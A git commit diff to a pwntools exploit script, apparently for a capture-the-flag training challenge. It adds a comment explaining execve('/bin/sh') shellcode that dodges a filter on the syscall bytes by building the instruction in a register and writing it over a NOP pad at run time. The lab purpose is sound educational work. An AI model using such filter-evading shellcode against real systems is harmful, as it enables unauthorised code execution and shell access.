7d682d1e94fd035fe12ad64f31cbd30eb30a19ff
vrige <46068335+vrige@users.noreply.github.com>
2023-01-07 17:48:03 +0100

    Update x.py

--- shellcodee/syscall_c/x.py
+++ shellcodee/syscall_c/x.py
@@ -5,6 +5,33 @@ context.terminal = ['tmux', 'splitw', '-h']
 r = remote("bin.training.jinblack.it", 3101)
 
 '''
+Inject a shellcode without using the istruction syscall in hex \x0F\x05.
+
+Solution
+Since we cannot write directly in our shellcode syscall, we have to find a workaround. A possible way is to write in ebx \x05\x0e and then add to ebx 1. We then can write the content of ebx (which is the hex for syscall) directly on the stack after we setup the registers. Since the istruction will occupy 8 bytes we creates an nop pad and using mov [rip], ebx we write syscall in the stack after the mov istruction.
+
+jmp binsh
+back:
+xor rax, rax
+mov al, 0x3b
+pop rdi
+xor rsi, rsi
+xor rdx,rdx
+xor ebx, ebx
+mov ebx, 0x50e
+add ebx, 0x1
+mov [rip], ebx
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+
+binsh:
+call back
 jmp binsh
 beforethemove:
 mov rax, 0x3b
